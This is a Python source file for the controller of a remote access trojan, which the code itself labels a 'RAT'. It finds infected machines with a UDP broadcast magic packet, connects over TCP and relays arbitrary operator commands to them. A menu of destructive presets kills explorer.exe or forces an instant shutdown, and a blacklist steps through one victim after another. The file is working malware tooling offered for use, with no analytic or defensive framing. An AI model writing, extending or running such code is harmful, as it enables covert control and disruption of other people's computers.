import os
import sys
import socket

dest = ('<broadcast>', 9234)
exchange = b'\xe2\x90\x0f#t\xe3\x13\xd3Ac'
blacklist = []

def scan():
    broadcast_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    broadcast_client.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    broadcast_client.sendto(exchange, dest)

    print('Looking For RAT...')
    while True:
        (buf, address) = broadcast_client.recvfrom(2048)
        if not len(buf):
            break
        else:
            if not address[0] in blacklist:
                print('Found RAT: {} ({})'.format(buf.decode(), address[0]))
                break
    broadcast_client.close()
    hostname = buf.decode()
    return hostname, address

def menu():
    print('')
    print('1. Kill explorer.exe')
    print('2. Start explorer.exe')
    print('3. Shutdown Instantly')
    print('4. Shutdown 5 Minutes')
    print('5. Cancel Shutdown')
    command = input(': ')
    if command == '1':
        command = 'taskkill /IM explorer.exe /F'
    elif command == '2':
        command = 'start explorer.exe'
    elif command == '3':
        command = 'shutdown /s /t 0'
    elif command == '4':
        command = 'shutdown /s /t {}'.format(60*5)
    elif command == '5':
        command = 'shutdown /a'
    return command

def control(hostname, address): 
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting... ', end='')
    client.connect(address)
    print('OK\n')
    while True:
        command = input('{}>>> '.format(hostname))
        if command == 'menu':
            command = menu()
        elif command == '<:next:>':
            client.close()
            blacklist.append(address[0])
            break
        if len(command) < 1:
            continue
        client.send(command.encode())
        data_recv = client.recv(10000)
        print(data_recv.decode())

if __name__ == '__main__':
    while True:
        control(*scan())
    
